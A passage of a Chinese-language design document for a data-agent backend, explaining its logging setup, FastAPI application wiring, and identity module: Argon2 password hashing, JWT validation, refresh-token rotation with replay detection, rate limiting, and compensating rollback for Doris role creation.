                "diagnose": False,
                "catch": True,
                "enqueue": True,
            },
            {
                "sink": str(LOG_DIR / "{time:YYYY-MM-DD}.jsonl"),
                "level": cfg.log.level,
                "format": _json_formatter,
                "rotation": cfg.log.rotation,
                "encoding": "utf-8",
                "backtrace": False,
                "diagnose": False,
                "catch": True,
                "enqueue": True,
            },
        ],
    )
```

逐项说明：

| 参数 | 值 | 作用 |
| --- | --- | --- |
| `rotation` | 10MB | 文件到 10MB 就切分 |
| `backtrace` | False | 不打印变量值的回溯（避免日志泄漏敏感数据） |
| `diagnose` | False | 同上，不显示局部变量 |
| `catch` | True | sink 本身出错时不让它把主流程带崩 |
| `enqueue` | True | **异步写日志**，多进程/多线程下不会因为写日志阻塞事件循环 |
| `colorize` | True | 只对控制台，文件不加颜色码 |

`@cache` 装饰器保证多次调用只配置一次（`lifespan`、Celery 任务、脚本都会调它）。

### 4.10.5 结构化载荷

JSON 格式的日志把上下文摊平成字段：

```python
def _build_log_payload(record: Record) -> dict[str, Any]:
    """构造结构化日志载荷。"""
    name = record.get("name") or ""
    function = record.get("function") or ""
    line = record.get("line") or ""
    location = f"{name}:{function}:{line}" if name or function or line else ""

    payload = {
        "time": record["time"].strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
        "level": record["level"].name,
        "location": location,
        "method": context.method_ctx.get(),
        "path": context.path_ctx.get(),
        "user_id": context.user_id_ctx.get(),
        "message": record["message"],
        "request_id": context.request_id_ctx.get(),
        "trace_id": context.trace_id_ctx.get(),
        "client_ip": context.client_ip_ctx.get(),
    }
```

**每条日志自动带上 request_id / trace_id / user_id**，这就是 ContextVar 的价值——业务代码里不需要手动传这些参数。

空值会被过滤掉，不写进 JSON：

```python
    return {
        key: value
        for key, value in payload.items()
        if value is not None and value != ""
    }
```

控制台格式用**白名单**渲染额外字段，避免 `extra` 里塞进大对象把控制台刷爆：

```python
    context_fields = [
        f"{key}={{extra[{key}]}}"
        for key in (
            "status",
            "problem_type",
            "exc_type",
            "index_name",
            "document_id",
            "document_ids",
            "resource_key",
            "stage",
        )
        if extra.get(key) is not None and extra.get(key) != ""
    ]
```

`user_id` 是**在认证之后手动设置的**，不是在中间件里：

```python
    user_id = current_user.id
    context.user_id_ctx.set(str(user_id))
```

因为中间件跑在认证之前，那时候还不知道用户是谁。

## 4.11 应用装配

### 4.11.1 生命周期：lifespan

`main.py` 的 `_lifespan` 是**所有共享资源的唯一初始化点**：

```python
@asynccontextmanager
async def _lifespan(_app: FastAPI):
    """初始化并释放应用进程持有的共享资源。"""
    try:
        # FastAPI 应用启动前执行。
        logger.info("开始初始化应用资源")
        embedding_client_manager.init()
        es_client_manager.init()
        await langgraph_postgres_manager.init()
        await sandbox_manager.init()
        await agent_manager.init()
        auth_postgres_client_manager.init()
        await auth_postgres_client_manager.init_tables()
        meta_postgres_client_manager.init()
        await meta_postgres_client_manager.init_tables()
        assistant_postgres_client_manager.init()
        await assistant_postgres_client_manager.init_tables()
        admin_doris_client_manager.init()
        await _verify_doris_query_identities()
        logger.info("应用资源初始化完成")

        yield
    finally:
        # FastAPI 应用结束前执行。
        logger.info("开始释放应用资源")
        await conversation_run_service.close()
        await agent_manager.close()
        await sandbox_manager.close()
        await langgraph_postgres_manager.close()
        await embedding_client_manager.close()
        await es_client_manager.close()
        await assistant_postgres_client_manager.close()
        await meta_postgres_client_manager.close()
        await auth_postgres_client_manager.close()
        await admin_doris_client_manager.close()
        await query_doris_client_registry.close()
        logger.info("应用资源释放完成")
```

**初始化的顺序是有依赖关系的**：

```
embedding / es          ← 无依赖
langgraph_postgres      ← Checkpoint 池 + advisory lock
sandbox_manager         ← 需要 Docker + Redis
agent_manager           ← 需要 langgraph_postgres + sandbox + tombstones
三个 PG 客户端 + init_tables  ← 建表
admin_doris_client      ← 管理连接
_verify_doris_query_identities ← 需要上面的全部
```

**释放顺序基本是初始化的逆序**。特别注意 `conversation_run_service.close()` 排在最前——它会取消所有正在跑的 Agent Run，必须先把这些任务停掉，再关它们依赖的 Checkpoint 和沙箱。

### 4.11.2 启动时的 Doris 权限自检

`_verify_doris_query_identities` 是一段**故意只告警不阻断**的检查：

```python
async def _verify_doris_query_identities() -> None:
    """校验数据库中全部查询身份的 Doris 权限。"""
    cipher = DorisCredentialCipher(
        cfg.doris_credentials.encryption_key.get_secret_value()
    )
    async with auth_postgres_client_manager.session() as session:
        identities = await IdentityPGRepo(session).list_query_identities()
    try:
        await DorisRoleRepository(admin_doris_client_manager).verify_configured_roles(
            tuple(identity.role_name for identity in identities)
        )
    except Exception as exc:  # noqa: BLE001
        # 管理员需要应用保持可用以修复 Doris 侧配置；实际查询仍会在身份解析和
        # Doris 权限边界失败，因此启动检查只负责暴露漂移，不放宽查询权限。
        logger.warning(f"Doris 查询角色完整性校验未通过，应用继续启动: {exc}")
    for identity in identities:
        try:
            manager = await query_doris_client_registry.get_or_create(
                identity.role_name,
                identity.query_user,
                cipher.decrypt(identity.encrypted_password),
            )
            await DorisQueryRepository(manager).verify_readonly_access(
                identity.workload_group,
                cfg.doris.database,
                identity.role_name,
            )
        except Exception as exc:  # noqa: BLE001
            logger.warning(
                f"Doris 角色 '{identity.role_name}' 未完成目标库表授权或校验未通过，"
                f"应用继续启动: {exc}"
            )
```

**为什么不阻断启动**：注释里说得很清楚——如果 Doris 侧配置漂移就让应用起不来，管理员就没法进管理中心去修配置，形成死锁。所以这里只暴露问题，真正的拦截留给查询链路（身份解析失败会直接拒绝查询）。

这个「启动检查只暴露，不放宽权限」的原则值得记住：**降级的是可用性，不是安全性**。

### 4.11.3 中间件与路由注册

```python
def _register_middlewares(app: FastAPI) -> None:
    """注册中间件。"""
    app.middleware("http")(trace.middleware)
    app.add_middleware(
        CORSMiddleware,
        allow_origins=cfg.cors_origins,
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )
```

**顺序注意**：`add_middleware` 是「后加的先执行」。这里 trace 用 `app.middleware("http")` 注册、CORS 用 `add_middleware`，实际执行顺序是 CORS 在外层。对追踪 ID 的生成没影响（trace 会在请求处理时设置）。

`cors_origins` 默认是空列表——**前后端同源部署（走 Vite 代理）时不需要配 CORS**。跨域部署时才加：

```yaml
cors_origins: [] # 允许跨域访问后端的前端 Origin 列表。
```

路由注册：

```python
def _register_routes(app: FastAPI) -> None:
    """注册接口。"""
    app.include_router(auth_router, prefix="/api/v1/auth")
    app.include_router(admin_router, prefix="/api/v1/admin")
    app.include_router(
        query_experience_admin_router,
        prefix="/api/v1/admin/query-experiences",
    )
    app.include_router(chat_router, prefix="/api/v1/chat")
    app.include_router(
        attachment_router,
        prefix="/api/v1/chat/attachment",
    )
    app.include_router(meta_router, prefix="/api/v1/meta")
    app.include_router(task_router, prefix="/api/v1/tasks")
```

前缀规划：

| 前缀 | 归属模块 | 说明 |
| --- | --- | --- |
| `/api/v1/auth` | identity | 登录/刷新/登出/改密/me |
| `/api/v1/admin` | identity | 用户、Doris 角色、权限 |
| `/api/v1/admin/query-experiences` | query | 查询经验管理（单独挂，因为它属于 query 模块） |
| `/api/v1/chat` | assistant | 会话与 SSE |
| `/api/v1/chat/attachment` | assistant | 附件上传/下载 |
| `/api/v1/meta` | metadata | 元数据目录与导入导出 |
| `/api/v1/tasks` | identity | 后台任务状态查询 |

**全部带 `/v1`**，为将来的不兼容变更留出空间。

### 4.11.4 全局单例装配入口

`app/providers.py` 只有 47 行，但它定义了整个应用的**对象图**：

```python
"""应用运行时依赖组装入口。"""

from app.assistant.agents.filesystem import packaged_skill_readonly_mounts
from app.assistant.agents.manager import AgentManager
from app.assistant.providers import build_conversation_lifecycle_service
from app.assistant.services.conversation_run import ConversationRunService
from app.assistant.services.conversation_tombstone_store import (
    ConversationTombstoneStore,
)
from app.identity.services.user_deletion_store import PostgresUserDeletionStateStore
from app.sandbox.providers import create_sandbox_manager
from app.shared.clients.langgraph_postgres_manager import langgraph_postgres_manager
from app.shared.clients.postgres_client_manager import (
    assistant_postgres_client_manager,
    auth_postgres_client_manager,
    meta_postgres_client_manager,
)
from app.shared.config.app_config import cfg
from app.workflows.user_deletion import UserDeletionService

sandbox_manager = create_sandbox_manager(
    cfg.sandbox,
    packaged_skill_readonly_mounts(),
)
conversation_tombstone_store = ConversationTombstoneStore(
    assistant_postgres_client_manager
)
agent_manager = AgentManager(
    langgraph_postgres_manager,
    sandbox_manager,
    conversation_tombstone_store,
)
conversation_run_service = ConversationRunService(agent_manager, sandbox_manager)
conversation_lifecycle_service = build_conversation_lifecycle_service(
    langgraph_postgres_manager,
    assistant_postgres_client_manager,
    meta_postgres_client_manager,
    agent_manager,
    sandbox_manager,
    cfg.lifecycle,
)
user_deletion_service = UserDeletionService(
    PostgresUserDeletionStateStore(auth_postgres_client_manager),
    sandbox_manager,
    conversation_lifecycle_service,
    cfg.lifecycle,
)
```

**这个文件的写法是刻意的**：只有「创建对象 + 注入依赖」，没有任何业务逻辑。要改依赖关系，只改这一个文件。

**为什么不用依赖注入框架**：FastAPI 的 `Depends` 适合**请求级**依赖（每个请求一个 session），但这些是**进程级单例**（连接池、Agent 管理器、沙箱管理器），生命周期和进程一致。用一个模块级的显式装配文件比引入 DI 框架更直白。

模块级创建对象有一个副作用：**import 这个模块就会建对象**。所以 `create_sandbox_manager` 之类的工厂函数里不能做 I/O（比如连 Docker），真正的初始化推迟到 `init()`。这一点在沙箱模块里被严格遵守（见第 8 章）。

---

# 5. 身份认证与数据授权（identity）

## 5.1 需求说明

这个模块要解决两个完全不同的问题，所以放在一起讲：

**问题一：用户是谁。** 平台有账号体系——注册、登录、刷新令牌、改密、登出。需要防止密码被拖库、防止令牌被重放、防止暴力破解。

**问题二：用户能看哪些数据。** 这一层比第一层复杂得多。平台不自己存业务数据，数据在 Doris 里。所以要做的是：

```
平台用户  →  绑定一个 Doris 角色  →  角色在 Doris 里被授予表/列级 SELECT 权限
                                          ↓
                             同一份权限要在应用侧也存一份
                             （因为语义召回不经过 Doris，要在召回阶段就过滤）
```

**输入输出**：

| 能力 | 输入 | 输出 |
| --- | --- | --- |
| 登录 | 用户名/邮箱 + 密码 | access token（15 分钟）+ refresh token（30 天） |
| 刷新 | refresh token | 新令牌对（旧 refresh 立即作废） |
| 建角色 | 角色名 + 查询用户 + 工作组 | Doris 侧建角色与用户，应用侧存加密密码与授权投影 |
| 授权 | 角色 + 表名/列名 | Doris 侧 `GRANT SELECT_PRIV`，应用侧写投影，轮换 `authorization_epoch` |
| 解析查询身份 | 用户 id | 查询用户名 + 解密密码 + 工作组 + 当前 epoch |
| 解析访问策略 | 用户 id | `AssetAccessPolicy`（可访问资产集合） |

**中间要经过哪些步骤**（一次数据查询的身份链路）：

```
用户 JWT
  → AccessTokenAuthenticator.authenticate  校验签名、auth_version、is_active
  → QueryPrincipalService.resolve          用户 → Doris 角色 → 解密查询密码
  → AuthorizationService.get_asset_policy  用户 → Doris 角色 → 授权投影 → 策略快照
  → 两个结果分别交给「执行器」和「SQL 校验器」
```

## 5.2 代码组织规划

```
app/identity/
├── errors.py                      全部领域异常，继承 ProblemError
├── api/
│   ├── auth/
│   │   ├── router.py              /login /refresh /logout /change-password /me
│   │   ├── dependencies.py        认证服务、当前用户、管理员、Doris 服务注入
│   │   └── schemas.py             请求/响应模型
│   └── admin/
│       ├── router.py              用户 CRUD、Doris 角色、SELECT 授权、行策略
│       ├── task_router.py         后台任务状态查询
│       └── schemas.py             管理端模型
├── models/
│   ├── account.py                 User / RefreshToken
│   ├── doris.py                   DorisQueryIdentity / DorisRoleAssetGrant / AssetScope
│   └── lifecycle.py               UserDeletionTask
├── repositories/
│   ├── identity.py                IdentityPGRepo（PG 侧全部读写 + 安全锁）
│   └── doris_role.py              DorisRoleRepository（Doris 侧 RBAC 命令）
└── services/
    ├── auth.py                    密码哈希 + JWT + 登录/刷新/登出/改密 + bootstrap
    ├── credential.py              DorisCredentialCipher（Fernet）
    ├── account_validation.py      用户名/邮箱/密码规则
    ├── rate_limit.py              登录与刷新限流
    ├── authorization.py           资产策略投影 + Doris 角色生命周期（Saga）
    ├── doris_permission.py        SELECT 授予/回收 + 行策略（双写 + 补偿）
    ├── query_principal.py         解析一次查询的 Doris 身份
    └── user_deletion_store.py     注销状态存储（受理/完成/失败/领取）
```

模块间关系：

```
                      ┌─────────────────────┐
                      │  api/auth/router.py │
                      └──────────┬──────────┘
                                 │
              ┌──────────────────┼──────────────────┐
              ▼                  ▼                  ▼
     ┌────────────────┐ ┌───────────────┐ ┌──────────────────┐
     │ AuthService    │ │ RateLimit     │ │ AuthService      │
     │ (auth.py)      │ │ (rate_limit)  │ │ .refresh/logout  │
     └───────┬────────┘ └───────────────┘ └──────────────────┘
             │
             ▼
     ┌────────────────┐        ┌──────────────────────┐
     │ JWTCodec       │        │ Argon2PasswordManager│
     └────────────────┘        └──────────────────────┘
             │
             ▼
     ┌────────────────────────────────────────────────┐
     │ IdentityPGRepo（唯一 PG 访问入口）              │
     └────────────────────────────────────────────────┘

  另一条线（管理员侧）：

     api/admin/router.py
        ├─ DorisRoleManagementService（authorization.py）
        │     ├─ IdentityPGRepo         写投影
        │     └─ DorisRoleRepository    写 Doris
        └─ DorisPermissionService（doris_permission.py）
              ├─ IdentityPGRepo
              └─ DorisRoleRepository
```

**为什么把「Doris 命令」和「PG 读写」拆成两个仓储**：因为它们的事务语义完全不同。PG 有事务可以回滚，Doris 没有。所有「先改 Doris 再改 PG」的操作都必须显式处理失败补偿，拆开后这个补偿逻辑在 service 层写得很清楚，不会藏在仓储里。

## 5.3 具体实现

### 5.3.1 密码哈希

用 Argon2id（`pwdlib` 的推荐配置）。**关键点是不要阻塞事件循环**——Argon2 是 CPU 密集型的，故意设计得慢（这正是它防暴力破解的原理）。

```python
ARGON2_MAX_CONCURRENCY = 2


class Argon2PasswordManager:
    """基于 Argon2id 的异步密码哈希实现。"""

    def __init__(self, *, max_concurrency: int = ARGON2_MAX_CONCURRENCY) -> None:
        """初始化 Argon2id 哈希器和并发限制。"""
        if max_concurrency <= 0:
            raise ValueError("max_concurrency 必须为正整数")
        self._password_hash = PasswordHash.recommended()
        self._dummy_hash = self._password_hash.hash("dataagent-dummy-password")
        self._semaphore = asyncio.Semaphore(max_concurrency)

    async def hash(self, password: str) -> str:
        """在线程池计算密码哈希。"""
        async with self._semaphore:
            return await to_thread.run_sync(self._password_hash.hash, password)

    async def verify(self, password: str, password_hash: str) -> bool:
        """在线程池校验密码。"""
        async with self._semaphore:
            return await to_thread.run_sync(
                self._password_hash.verify,
                password,
                password_hash,
            )

    async def verify_dummy_password(self, password: str) -> None:
        """为未知账号执行等价密码校验，避免暴露账号是否存在。"""
        await self.verify(password, self._dummy_hash)
```

三个设计点：

1. **`to_thread.run_sync` 把哈希扔到线程池**。Argon2 一次校验大约几十到几百毫秒，直接在当前协程里跑会把整个事件循环卡住——所有并发请求一起等。
2. **信号量限制并发为 2**。线程池默认可以开很多线程，但 Argon2 吃 CPU 和内存（`PasswordHash.recommended()` 默认参数下每次约 64MB），不限并发会让登录接口把机器打满。这个限流**本身就是防 DoS 的一部分**。
3. **`verify_dummy_password` 防账号枚举**。如果「用户不存在」直接返回、而「密码错」要跑一次 Argon2，攻击者可以用响应时间区分「这个账号存在吗」。`__init__` 里预先算一个 dummy hash，用户不存在时也跑一次等价校验，把时间差抹平：

```python
        normalized = identifier.strip().casefold()
        async with self._repo.session.begin():
            user = (
                await self._repo.get_user_by_email_for_update(normalized)
                if "@" in normalized
                else await self._repo.get_user_by_username_for_update(normalized)
            )
            if user is None:
                await self._password_manager.verify_dummy_password(password)
                raise auth_error.InvalidCredentialsError
```

注意 `get_user_by_email_for_update` 用的是**行锁查询**（`FOR UPDATE`），不是普通查询。这样并发登录同一个账号时会串行化，避免出现「两个请求同时刷新 token」的竞态。

### 5.3.2 JWT 签发与校验

访问令牌短、刷新令牌长，两者用 `token_type` 区分：

```python
    def issue_access_token(self, user: User, now: datetime) -> str:
        """签发短期访问令牌。"""
        expires_at = now + timedelta(minutes=self._config.access_token_minutes)
        payload: dict[str, Any] = {
            "sub": str(user.id),
            "auth_version": user.auth_version,
            "token_type": "access",
            "iat": now,
            "exp": expires_at,
            "iss": self._config.issuer,
        }
        return jwt.encode(
            payload,
            self._secret,
            algorithm=self._config.jwt_algorithm,
        )

    def issue_refresh_token(
        self,
        user_id: int,
        token_id: UUID,
        family_id: UUID,
        now: datetime,
    ) -> str:
        """签发长期刷新令牌。"""
        return jwt.encode(
            {
                "sub": str(user_id),
                "jti": str(token_id),
                "family_id": str(family_id),
                "token_type": "refresh",
                "iat": now,
                "exp": now + timedelta(days=self._config.refresh_token_days),
                "iss": self._config.issuer,
            },
            self._secret,
            algorithm=self._config.jwt_algorithm,
        )
```

**`auth_version` 是访问令牌的失效开关**。用户改密码时 `auth_version` 自增，所有旧 access token 立即失效（下面 `authenticate` 里会比对）。这样不需要维护 access token 黑名单。

**`jti` + `family_id` 是刷新令牌的两个关键声明**：

- `jti`（JWT ID）指向数据库里那条 `refresh_tokens` 记录。
- `family_id` 是「令牌族」——一次登录产生的所有轮换令牌共享同一个族 ID。检测到重放时吊销整族。

校验部分：

```python
    def _decode(
        self,
        token: str,
        expected_type: str,
        *,
        required_claims: set[str],
    ) -> dict[str, Any]:
        """验证 JWT 签名、标准声明与令牌类型。"""
        try:
            payload = jwt.decode(
                token,
                self._secret,
                algorithms=[self._config.jwt_algorithm],
                issuer=self._config.issuer,
                leeway=5,
                options={"require": sorted(required_claims)},
            )
        except jwt.PyJWTError as exc:
            raise auth_error.InvalidTokenError from exc
        if payload.get("token_type") != expected_type:
            raise auth_error.InvalidTokenError(detail="非预期的令牌类型")
        return cast(dict[str, Any], payload)
```

三个安全要点：

1. **`algorithms=[...]` 显式指定**。不指定的话有经典的 `alg=none` 攻击——攻击者把 header 改成 `{"alg":"none"}` 就能伪造任意 token。
2. **`options={"require": ...}` 要求必须出现所有关键声明**。否则一个缺 `exp` 的 token 会永不过期。
3. **`token_type` 必须匹配**。防止「拿 refresh token 当 access token 用」——如果只校验签名，两者都能通过。

`leeway=5` 是给时钟漂移留 5 秒容差。多机部署时服务器之间时钟不可能完全一致。

声明解析全部做了类型和范围校验：

```python
    @staticmethod
    def _parse_user_id(payload: dict[str, Any]) -> int:
        """解析用户主键声明。"""
        try:
            user_id = int(payload["sub"])
        except (KeyError, TypeError, ValueError) as exc:
            raise auth_error.InvalidTokenError(detail="令牌主体标识无效") from exc
        if user_id <= 0:
            raise auth_error.InvalidTokenError(detail="令牌主体标识无效")
        return user_id
```

`auth_version` 的解析特意排除了 `bool`：

```python
        value = payload.get("auth_version")
        if isinstance(value, bool) or not isinstance(value, (int, str)):
            raise auth_error.InvalidTokenError(detail="令牌鉴权版本无效")
```

因为 Python 里 `isinstance(True, int)` 是 `True`，不排除的话 `auth_version: true` 会被当成 `1`。

访问令牌的认证：

```python
    async def authenticate(self, access_token: str) -> AuthenticatedUser:
        """校验访问令牌并返回脱离会话的用户快照。"""
        claims = self._codec.decode_access_token(access_token)
        user = await self._repo.get_user_by_id(claims.user_id)
        if user is None:
            raise auth_error.InvalidTokenError
        _ensure_active_user(user)
        if user.auth_version != claims.auth_version:
            raise auth_error.InvalidTokenError
        return AuthenticatedUser.from_user(user)
```

**每次都查数据库**。这是一个刻意的取舍：JWT 无状态的好处是不查库，但代价是「改了密码/禁用了账号，旧 token 还能用 15 分钟」。这里选择查库换实时性，15 分钟的 access token 有效期意味着这个查询频率可以接受。

返回的是**脱离会话的不可变快照**：

```python
@dataclass(frozen=True, slots=True)
class AuthenticatedUser:
    """脱离数据库会话的认证用户快照。"""

    id: int
    username: str
    email: str
    auth_version: int
    is_active: bool
    is_admin: bool
    doris_role_name: str | None
    created_at: datetime
```

**为什么要快照**：认证用的 session 在依赖注入结束时就被关闭了。如果返回 ORM 对象，后续在路由函数里访问 `user.username` 会触发懒加载 → 异步环境报 `MissingGreenlet`。快照是纯 Python 对象，没有会话依赖。

### 5.3.3 刷新令牌的轮换与重放检测

这是整个认证模块里最值得讲的一段。

```python
    async def refresh(self, refresh_token: str) -> tuple[User, TokenPair]:
        """轮换刷新令牌并签发新令牌对。"""
        claims = self._codec.decode_refresh_token(refresh_token)
        token_digest = self.digest_token(refresh_token)
        now = self._now()
        reuse_detected = False
        loaded_user: User | None = None
        token_pair: TokenPair | None = None

        async with self._repo.session.begin():
            loaded_user = await self._repo.get_user_by_id_for_update(claims.user_id)
            current = await self._repo.get_refresh_token_for_update(claims.token_id)
            if (
                loaded_user is None
                or current is None
                or current.user_id != claims.user_id
                or current.family_id != claims.family_id
                or not hmac.compare_digest(current.token_hash, token_digest)
            ):
                raise auth_error.InvalidTokenError
            if current.revoked_at is not None:
                await self._repo.revoke_refresh_family(current.family_id, now)
                reuse_detected = True
            else:
                _ensure_active_user(loaded_user)
                replacement_id = uuid4()
                token_pair = await self._issue_token_pair(
                    loaded_user,
                    current.family_id,
                    refresh_token_id=replacement_id,
                )
                self._repo.rotate_refresh_token(current, replacement_id, now)

        if reuse_detected:
            raise auth_error.RefreshTokenReuseError(detail="该刷新令牌已被注销")
        if loaded_user is None or token_pair is None:
            raise RuntimeError("刷新令牌轮换未生成有效令牌对")
        logger.info(f"刷新令牌轮换成功: user_id={loaded_user.id}")
        return loaded_user, token_pair
```

**机制拆解**：

1. **令牌不以明文存库**。库里存的是 `sha256(token)`：

```python
    @staticmethod
    def digest_token(token: str) -> str:
        """计算令牌的不可逆存储摘要。"""
        return hashlib.sha256(token.encode("utf-8")).hexdigest()
```

这样即使数据库被拖，攻击者拿到的哈希也不能直接当 token 用。

2. **比对用 `hmac.compare_digest`** 而不是 `==`。`==` 会在第一个不同的字节处提前返回，理论上可以用时间差逐字节爆破。`compare_digest` 是恒定时间比较。

3. **三重一致性校验**：`current.user_id != claims.user_id`（token 里的用户与库里的记录对得上吗）、`current.family_id != claims.family_id`（族 ID 对得上吗）、哈希对得上吗。少任何一条，攻击者只要猜对一个就能伪造。

4. **重放检测**：如果这个 refresh token 已经被标记为 `revoked_at`（说明它已经被用过一次了），那么**吊销整个令牌族**。

   为什么？正常情况下每个 refresh token 只能用一次，用掉就轮换成新的。如果同一个 token 被用了第二次，只有两种可能：要么是攻击者偷到了旧 token，要么是合法用户的客户端出了 bug 重发。无论哪种，安全的选择是把这一族全部作废，强制重新登录。

   代价是：**并发刷新会互相踢掉**。前端必须做「单飞刷新」（同一时刻只允许一个刷新请求），这一点在前端 `auth/session.ts` 里实现了（见 12 章）。

5. **`reuse_detected` 标志延迟到事务外才抛异常**。因为异常在 `async with session.begin()` 里抛出会触发回滚，而吊销令牌族这个操作必须提交。所以先在事务里吊销、提交，出了事务再抛错。

6. **两次 `for_update` 行锁**。先锁用户行（防止并发改密码/禁用），再锁 token 行（防止并发轮换）。加锁顺序固定，避免死锁。

登出的实现是同一套校验逻辑，只是动作变成吊销整族：

```python
    async def logout(self, refresh_token: str) -> None:
        """吊销刷新令牌所属的完整令牌族。"""
        claims = self._codec.decode_refresh_token(refresh_token)
        token_digest = self.digest_token(refresh_token)
        async with self._repo.session.begin():
            current = await self._repo.get_refresh_token_for_update(claims.token_id)
            if (
                current is None
                or current.user_id != claims.user_id
                or current.family_id != claims.family_id
                or not hmac.compare_digest(current.token_hash, token_digest)
            ):
                raise auth_error.InvalidTokenError
            await self._repo.revoke_refresh_family(current.family_id, self._now())
        logger.info(f"用户退出登录并吊销令牌族: user_id={claims.user_id}")
```

改密要连带吊销全部令牌：

```python
        async with self._repo.session.begin():
            user = await self._repo.get_user_by_id_for_update(user_id)
            if user is None:
                raise auth_error.InvalidTokenError
            _ensure_active_user(user)
            if not await self._password_manager.verify(
                current_password,
                user.password_hash,
            ):
                raise auth_error.InvalidCurrentPasswordError
            await self._repo.set_user_password(user, password_hash)
            await self._repo.revoke_user_refresh_tokens(user.id, self._now())
```

`set_user_password` 内部会自增 `auth_version`，所以改密后 access token 也一起失效——用户被强制重新登录。

### 5.3.4 限流

三组独立的限流规则：

```python
LOGIN_IP_RATE_LIMIT = 30
LOGIN_IDENTIFIER_RATE_LIMIT = 10
LOGIN_RATE_WINDOW_SECONDS = 60
REFRESH_RATE_LIMIT = 60
REFRESH_RATE_WINDOW_SECONDS = 60
IP_RATE_LIMIT_MAX_KEYS = 10_000
IDENTIFIER_RATE_LIMIT_MAX_KEYS = 50_000
```

| 规则 | 限制 | 防什么 |
| --- | --- | --- |
| 登录 / 单 IP | 60 秒 30 次 | 一台机器扫多个账号 |
| 登录 / 单账号 | 60 秒 10 次 | 针对某个账号的密码爆破 |
| 刷新 / 单 IP | 60 秒 60 次 | 刷新接口滥用 |

**为什么要分 IP 和账号两个维度**：只限 IP 挡不住分布式爆破（攻击者用大量代理 IP 打一个账号）；只限账号挡不住撞库（一个 IP 试很多账号）。两个一起限才有效。

入口：

```python
    async def check_login(self, client_ip: str, identifier: str) -> None:
        """同时限制登录来源 IP 与账号标识。"""
        await self._login_ip.consume(self._normalize_ip(client_ip))
        await self._login_identifier.consume(self._normalize_identifier(identifier))

    async def check_refresh(self, client_ip: str) -> None:
        """限制单个来源 IP 的令牌刷新频率。"""
        await self._refresh_ip.consume(self._normalize_ip(client_ip))
```

Redis 版实现用 Lua 脚本保证「检查 + 计数」的原子性（用 zset 做滑动窗口），并且**只把键的 sha256 摘要发给 Redis**：

```python
    async def consume(self, key: str) -> None:
        """原子消费跨进程共享额度，Redis 只接收不可逆键摘要。"""
        digest = hashlib.sha256(key.encode("utf-8")).hexdigest()
        now_milliseconds = int(self._clock() * 1000)
        window_milliseconds = max(1, int(self._rule.window_seconds * 1000))
        try:
            result = await to_thread.run_sync(
                self._consume_sync,
                digest,
                now_milliseconds,
                window_milliseconds,
            )
        except RedisError as exc:
            raise RuntimeError("认证限流 Redis 不可用") from exc
        state = int(result[0])
        retry_after = int(result[1])
        if state == 1:
            raise auth_error.RateLimitExceededError(
                retry_after_seconds=retry_after,
            )
```

**为什么要哈希**：Redis 的 key 里会包含用户名/邮箱/IP。明文写进去等于把「谁在什么时候登录」这份数据泄漏给了 Redis（以及任何能看 Redis 的人）。哈希后仍然能做计数，但看不出原始值。

**Redis 不可用时的行为**：抛 `RuntimeError`（不是限流异常，是 500）。这是一个明确的取舍——限流组件挂了就拒绝登录，而不是「放行所有请求」。安全组件故障时选择 fail-closed。

### 5.3.5 Doris 角色管理：双写与 Saga 补偿

**问题**：创建角色要同时改两个系统。

```
Doris 侧：CREATE ROLE xxx; CREATE USER xxx; GRANT ... 
PG  侧：INSERT INTO doris_query_identities (...)
```

Doris 不参与 PG 事务。如果在 PG 插入时失败（比如角色名撞了唯一约束），Doris 里那个角色就变成孤儿。

**做法**：用一个 `doris_created` 标志记录「Doris 侧已经动过了」，失败时补偿回滚：

```python
    async def create_role(
        self,
        *,
        role_name: str,
        description: str,
        query_user: str,
        workload_group: str,
    ) -> DorisQueryIdentity:
        """创建 Doris 角色及唯一稳定查询身份。"""
        role = normalize_doris_role_name(role_name)
        self._doris_repo.quote_identifier(query_user)
        self._doris_repo.quote_identifier(workload_group)
        await self._require_workload_group(workload_group)
        password = self._cipher.generate_password()
        doris_created = False
        try:
            async with self._repo.session.begin():
                await self._repo.lock_security_mutation()
                if await self._repo.get_query_identity(role) is not None:
                    raise auth_error.RoleAlreadyExistsError
                if (
                    await self._repo.get_query_identity_by_query_user(query_user)
                    is not None
                ):
                    raise auth_error.QueryUserAlreadyExistsError(
                        detail=f"Doris 查询用户 {query_user} 已存在"
                    )
                await self._doris_repo.create_role_identity(
                    role_name=role,
                    query_user=query_user,
                    password=password,
                    workload_group=workload_group,
                )
                doris_created = True
                return await self._repo.add_query_identity(
                    DorisQueryIdentity(
                        role_name=role,
                        description=description,
                        query_user=query_user,
                        encrypted_password=self._cipher.encrypt(password),
                        workload_group=workload_group,
                        is_default=False,
                    )
                )
```

补偿分支：

```python
        except BaseException as exc:
            if doris_created:
                try:
                    await self._doris_repo.drop_role_identity(
                        role_name=role,
                        query_user=query_user,
                    )
                except Exception:  # noqa: BLE001
                    logger.exception(f"补偿删除 Doris 角色及用户失败: {role}")
            if isinstance(exc, DorisQueryUserAlreadyExistsError):
                raise auth_error.QueryUserAlreadyExistsError(
                    detail=f"Doris 查询用户 {exc.query_user} 已存在"
                ) from exc
            if isinstance(exc, IntegrityError):
                raise auth_error.RoleAlreadyExistsError from exc
            if isinstance(exc, DorisRoleAlreadyExistsError):
                raise auth_error.RoleAlreadyExistsError(
                    detail=f"Doris 角色 {role} 已存在"
                ) from exc
            if isinstance(exc, DorisWorkloadGroupNotFoundError):
                raise self._workload_group_not_found(workload_group) from exc
            raise
```

三个细节：

1. **`except BaseException` 而不是 `except Exception`**。`asyncio.CancelledError` 继承自 `BaseException`（Python 3.8+），用 `Exception` 会漏掉任务取消的情况——而取消恰恰是最容易留下半成品的场景。
2. **补偿失败只记日志**。补偿本身失败说明 Doris 也不可用，此时没有更好的办法，只能留下日志让运维人工介入。
3. **异常翻译成领域异常**。Doris 侧的 `DorisRoleAlreadyExistsError` 翻译成 `RoleAlreadyExistsError`（409），客户端只需要认识一套错误码。

删除角色的补偿更复杂，因为它要保存**完整快照**才能恢复：

```python
@dataclass(frozen=True, slots=True)
class _RoleDeletionSnapshot:
    """跨存储删除 Doris 角色前保存的完整恢复状态。"""

    role_name: str
    query_user: str
    workload_group: str
    password: str = field(repr=False)
    select_grants: tuple[_RoleSelectGrantSnapshot, ...] = ()
    row_policies: tuple[DorisRowPolicy, ...] = ()
```

注意 `password: str = field(repr=False)`——`repr=False` 让这个字段不出现在 `repr()` 输出里，避免调试时把密码打进日志。同一个技巧在 `ResolvedQueryPrincipal` 里也用了。

删除流程：

```python
    async def delete_role(self, role_name: str) -> None:
